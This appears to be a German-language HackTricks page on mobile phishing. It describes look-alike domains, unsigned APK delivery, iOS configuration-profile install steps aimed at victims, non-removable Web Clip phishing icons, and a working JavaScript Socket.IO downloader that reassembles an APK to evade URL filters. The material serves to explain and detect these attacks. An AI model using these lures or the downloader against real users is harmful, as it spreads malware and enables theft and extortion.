# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Diese Seite behandelt Techniken, die von Threat Actors verwendet werden, um **malicious Android APKs** und **iOS mobile-configuration profiles** über Phishing (SEO, Social Engineering, fake stores, dating apps, etc.) zu verbreiten.
> Das Material ist adaptiert aus der SarangTrap-Kampagne, die von Zimperium zLabs (2025) offengelegt wurde, sowie aus weiterer öffentlicher Forschung.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Dutzende von Look-alike-Domains registrieren (dating, cloud share, car service…).
– Lokale Sprach-Keywords und Emojis im `<title>`-Element verwenden, um in Google zu ranken.
– *Sowohl* Android (`.apk`) als auch iOS-Installationsanweisungen auf derselben Landing Page hosten.
2. **First Stage Download**
* Android: direkter Link zu einem *unsigned* oder „third-party store“ APK.
* iOS: `itms-services://` oder einfacher HTTPS-Link zu einem malicious **mobileconfig**-Profil (siehe unten).
3. **Android Post-install Behaviour**
* C2-gesteuerte Ausführung, Berechtigungs-Missbrauch, Dropper-Bypasses, Hintergrundsammlung und anderes Post-install malware-Verhalten werden auf der dedizierten Android Malware Post-Exploitation-Seite unten behandelt.
4. **iOS Delivery Technique**
* Ein einzelnes **mobile-configuration profile** kann `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` usw. anfordern, um das Gerät in eine „MDM“-ähnliche Supervision einzubinden.
* Social-engineering instructions:
1. Öffne Settings ➜ *Profile downloaded*.
2. Tippe dreimal auf *Install* (Screenshots auf der Phishing-Seite).
3. Vertraue dem unsigned profile ➜ der Angreifer erhält *Contacts* & *Photo* Entitlement ohne App Store Review.
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` Payloads können **eine phishing URL auf dem Home Screen anheften** mit einem gebrandeten Icon/Label.
* Web Clips können **full-screen** ausgeführt werden (verbirgt die Browser-UI) und als **non-removable** markiert werden, wodurch das Opfer das Profil löschen muss, um das Icon zu entfernen.
6. **Network Layer**
* Einfaches HTTP, oft auf Port 80 mit HOST-Header wie `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (kein TLS → leicht zu erkennen).

## Android Malware Post-Exploitation

Für Android malware tradecraft nach der Installation wie C2, Accessibility-Missbrauch, Overlays, ATS automation, staged DEX loading, premium SMS und Persistence, siehe:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Angreifer ersetzen zunehmend statische APK-Links durch einen Socket.IO/WebSocket-Channel, der in Google-Play-ähnliche Lockangebote eingebettet ist. Das verschleiert die Payload-URL, umgeht URL-/Extension-Filter und erhält eine realistische Install-UX.

Typischer im Feld beobachteter Client-Flow:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Warum es einfache Kontrollen umgeht:
- Es wird keine statische APK-URL offengelegt; die Payload wird im Speicher aus WebSocket-Frames rekonstruiert.
- URL/MIME/Extension-Filter, die direkte .apk-Antworten blockieren, können Binärdaten übersehen, die via WebSockets/Socket.IO getunnelt werden.
- Crawler und URL-Sandboxes, die WebSockets nicht ausführen, rufen die Payload nicht ab.

Siehe auch WebSocket tradecraft und tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References


- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Socket.IO](https://socket.io)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
